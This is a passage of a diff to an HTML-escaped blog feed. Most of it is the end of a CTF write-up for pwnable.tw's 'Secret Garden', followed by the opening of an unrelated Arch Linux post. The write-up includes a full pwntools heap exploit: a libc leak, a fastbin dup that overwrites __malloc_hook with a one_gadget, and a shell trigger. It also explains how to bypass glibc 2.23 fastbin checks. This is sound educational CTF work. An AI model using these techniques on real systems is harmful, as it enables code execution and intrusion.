data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    log&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;info&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;leaked libc_base: &amp;#123;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Overwrite __malloc_hook with one gadget using fastbin dup.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sym&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;__malloc_hook&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# Trigger __malloc_hook.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# It seems that raising a flower will cause the one gadgets to crash.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# An alternative way is to trigger __malloc_hook via malloc_printerr().&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;# To do this, we can trigger a &#34;double free or corruption (fasttop)&#34;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x48&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# prepare a chunk for (fasttop) error&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;create&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x68&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;19&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;b&#39;A&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;libc_base &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; one_gadget&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# overwrite __malloc_hook&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    chall&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    proc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; __name__ &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;__main__&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    main&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;fastbin-related-error-handling&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#fastbin-related-error-handling&#34;&gt;#&lt;/a&gt; Fastbin-Related Error Handling&lt;/h1&gt;
-&lt;h2 id=&#34;check-1-double-free-or-corruption-fasttop&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#check-1-double-free-or-corruption-fasttop&#34;&gt;#&lt;/a&gt; Check 1: double free or corruption (fasttop)&lt;/h2&gt;
-&lt;p&gt;In glibc 2.23,  &lt;code&gt;_int_free()&lt;/code&gt;  will refuse to free the given pointer  &lt;code&gt;p&lt;/code&gt;  when the first chunk in fastbin is  &lt;code&gt;p&lt;/code&gt; .&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;/* Check that the top of the bin is not the record we are going to add&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   (i.e., double free).  */&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;old &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; p&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	errstr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;double free or corruption (fasttop)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;goto&lt;/span&gt; errout&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Source: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3&#34;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;Full-Exploit-Script&#34;&gt;&lt;a href=&#34;#Full-Exploit-Script&#34; class=&#34;headerlink&#34; title=&#34;Full Exploit Script&#34;&gt;&lt;/a&gt;Full Exploit Script&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;#!/usr/bin/env python3
+# -*- encoding: utf-8 -*-
+
+from pwn import *
+context.update(arch = &amp;#39;amd64&amp;#39;, os = &amp;#39;linux&amp;#39;, log_level = &amp;#39;debug&amp;#39;)
+
+elf  = ELF(&amp;#39;./secretgarden&amp;#39;, checksec = False)
+libc = ELF(&amp;#39;./libc_64.so.6&amp;#39;, checksec = False)
+one_gadget = 0xef6c4
+A8 = 7 * b&amp;#39;A&amp;#39;
+
+class Challenge:
+    def __init__(self, proc):
+        self.proc = proc
+
+    def create(self, len_name, name = A8, color = A8):
+        &amp;quot;&amp;quot;&amp;quot; malloc(0x28), malloc(len_name) &amp;quot;&amp;quot;&amp;quot;
+        self.proc.sendlineafter(b&amp;#39;choice : &amp;#39;, b&amp;#39;1&amp;#39;)
+        self.proc.sendlineafter(b&amp;#39;name :&amp;#39;, str(len_name).encode(&amp;#39;utf-8&amp;#39;))
+        self.proc.sendlineafter(b&amp;#39;of flower :&amp;#39;, name)
+        self.proc.sendlineafter(b&amp;#39;the flower :&amp;#39;, color)
+
+    def visit(self):
+        self.proc.sendlineafter(b&amp;#39;choice : &amp;#39;, b&amp;#39;2&amp;#39;)
+
+    def remove(self, index):
+        self.proc.sendlineafter(b&amp;#39;choice : &amp;#39;, b&amp;#39;3&amp;#39;)
+        self.proc.sendlineafter(b&amp;#39;garden:&amp;#39;, str(index).encode(&amp;#39;utf-8&amp;#39;))
+
+    def cleanup(self):
+        self.proc.sendlineafter(b&amp;#39;choice : &amp;#39;, b&amp;#39;4&amp;#39;)
+
+def main():
+    proc = remote(&amp;#39;chall.pwnable.tw&amp;#39;, 10203)
+
+    chall = Challenge(proc)
+
+    # Prepare a large chunk.
+    chall.create(0x420)
+
+    # Prevents the large chunk from being merged into the top chunk.
+    chall.create(0x38)
+
+    # Prevents the 0x430-byte chunk from being split.
+    chall.create(0x28)
+    chall.remove(2)
+
+    # Free the 0x430-byte chunk into unsorted bin.
+    chall.remove(0)
+
+    # Allocate the 0x430-byte chunk again so that visit() can print it.
+    chall.create(0x420, b&amp;#39;&amp;#39;, b&amp;#39;A&amp;#39;)
+
+    chall.visit()
+
+    proc.recvuntil(b&amp;#39;flower[3] :&amp;#39;)
+    leaked = u64(proc.recv(6).ljust(8, b&amp;#39;\x00&amp;#39;))
+    offset = 0x7fb7dafc4b0a - 0x7fb7dac01000
+    libc_base = leaked - offset
+    log.info(&amp;#39;leaked libc_base: &amp;#123;&amp;#125;&amp;#39;.format(hex(libc_base)))
+
+    # Overwrite __malloc_hook with one gadget using fastbin dup.
+    chall.create(0x68)
+    chall.create(0x68)
+    chall.remove(4)
+    chall.remove(5)
+    chall.remove(4)
+    chall.create(0x68, p64(libc_base + libc.sym[&amp;#39;__malloc_hook&amp;#39;] - 35))
+    chall.create(0x68)
+    chall.create(0x68)
+
+    # Trigger __malloc_hook.
+    # It seems that raising a flower will cause the one gadgets to crash.
+    # An alternative way is to trigger __malloc_hook via malloc_printerr().
+    # To do this, we can trigger a &amp;quot;double free or corruption (fasttop)&amp;quot;.
+    chall.create(0x48)  # prepare a chunk for (fasttop) error
+    chall.create(0x68, 19 * b&amp;#39;A&amp;#39; + p64(libc_base + one_gadget))  # overwrite __malloc_hook
+    chall.remove(9)
+    chall.remove(9)
+
+    proc.interactive()
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;Fastbin-Related-Error-Handling&#34;&gt;&lt;a href=&#34;#Fastbin-Related-Error-Handling&#34; class=&#34;headerlink&#34; title=&#34;Fastbin-Related Error Handling&#34;&gt;&lt;/a&gt;Fastbin-Related Error Handling&lt;/h1&gt;&lt;h2 id=&#34;Check-1-double-free-or-corruption-fasttop&#34;&gt;&lt;a href=&#34;#Check-1-double-free-or-corruption-fasttop&#34; class=&#34;headerlink&#34; title=&#34;Check 1: double free or corruption (fasttop)&#34;&gt;&lt;/a&gt;Check 1: double free or corruption (fasttop)&lt;/h2&gt;&lt;p&gt;In glibc 2.23, &lt;code&gt;_int_free()&lt;/code&gt; will refuse to free the given pointer &lt;code&gt;p&lt;/code&gt; when the first chunk in fastbin is &lt;code&gt;p&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;/* Check that the top of the bin is not the record we are going to add
+   (i.e., double free).  */
+if (__builtin_expect(old == p, 0)) &amp;#123;
+    errstr = &amp;quot;double free or corruption (fasttop)&amp;quot;;
+    goto errout;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Source: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3&#34;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937&lt;/span&gt;&lt;/p&gt;
 &lt;p&gt;To bypass this restriction, a commonly used technique is:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;free(A)&lt;/li&gt;
 &lt;li&gt;free(B)&lt;/li&gt;
 &lt;li&gt;free(A)&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h2 id=&#34;check-2-malloc-memory-corruption-fast&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#check-2-malloc-memory-corruption-fast&#34;&gt;#&lt;/a&gt; Check 2: malloc(): memory corruption (fast)&lt;/h2&gt;
-&lt;p&gt;In glibc 2.23,  &lt;code&gt;_int_malloc()&lt;/code&gt;  will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;__builtin_expect&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;fastbin_index&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;chunksize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; idx&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	errstr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;malloc(): memory corruption (fast)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;errout&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token function&#34;&gt;malloc_printerr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;check_action&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; errstr&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;chunk2mem&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;victim&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; av&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;Source: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1&#34;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;To bypass this restriction, the freed chunk’s  &lt;code&gt;size&lt;/code&gt;  field (right before  &lt;code&gt;fd&lt;/code&gt; ) must be set to the correct size. A commonly used technique is to:&lt;/p&gt;
+&lt;h2 id=&#34;Check-2-malloc-memory-corruption-fast&#34;&gt;&lt;a href=&#34;#Check-2-malloc-memory-corruption-fast&#34; class=&#34;headerlink&#34; title=&#34;Check 2: malloc(): memory corruption (fast)&#34;&gt;&lt;/a&gt;Check 2: malloc(): memory corruption (fast)&lt;/h2&gt;&lt;p&gt;In glibc 2.23, &lt;code&gt;_int_malloc()&lt;/code&gt; will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;c&#34;&gt;if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) &amp;#123;
+    errstr = &amp;quot;malloc(): memory corruption (fast)&amp;quot;;
+errout:
+    malloc_printerr(check_action, errstr, chunk2mem (victim), av);
+    return NULL;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Source: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1&#34;&gt;https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;To bypass this restriction, the freed chunk’s &lt;code&gt;size&lt;/code&gt; field (right before &lt;code&gt;fd&lt;/code&gt;) must be set to the correct size. A commonly used technique is to:&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;Look for the byte pattern  &lt;code&gt;7f 00 00 00 00 00 00 00&lt;/code&gt;  in memory, and use it as the  &lt;code&gt;size&lt;/code&gt;  field.&lt;/li&gt;
+&lt;li&gt;Look for the byte pattern &lt;code&gt;7f 00 00 00 00 00 00 00&lt;/code&gt; in memory, and use it as the &lt;code&gt;size&lt;/code&gt; field.&lt;/li&gt;
 &lt;li&gt;Go back 8 bytes to obtain the base address of the chunk.&lt;/li&gt;
 &lt;li&gt;Place this chunk into a fastbin, either by free()ing it or fastbin dup.&lt;/li&gt;
 &lt;/ul&gt;
@@ -244,41 +336,33 @@ chall.remove(9)
         <title>Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD</title>
         <link rel="alternate" href="https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/"/>
         <content type="html">&lt;p&gt;&lt;img data-src=&#34;banner.jpg&#34; alt=&#34;banner&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;introduction&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#introduction&#34;&gt;#&lt;/a&gt; Introduction&lt;/h1&gt;
-&lt;p&gt;The only laptop I own is Apple’s &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9zcDcwND9sb2NhbGU9ZW5fVVM=&#34;&gt;MacBook Pro Retina 15&amp;quot; (late 2014)&lt;/span&gt;, on which I’ve run Gentoo Linux for about three years. Recently, I replaced my MacBook’s SSD with &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2Ftc3VuZy5jb20vc2VtaWNvbmR1Y3Rvci9taW5pc2l0ZS9zc2QvcHJvZHVjdC9jb25zdW1lci85NzBldm9wbHVzLw==&#34;&gt;Samsung’s 970 EVO Plus NVMe M.2 SSD (1TB)&lt;/span&gt; and decided to install Arch Linux on it.&lt;/p&gt;
-&lt;h1 id=&#34;back-up-the-old-ssd&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#back-up-the-old-ssd&#34;&gt;#&lt;/a&gt; Back Up the Old SSD&lt;/h1&gt;
-&lt;p&gt;I booted into a  &lt;code&gt;Gentoo Live USB&lt;/code&gt;  and used  &lt;code&gt;dd&lt;/code&gt;  to back up my entire old SSD to an image file.&lt;/p&gt;
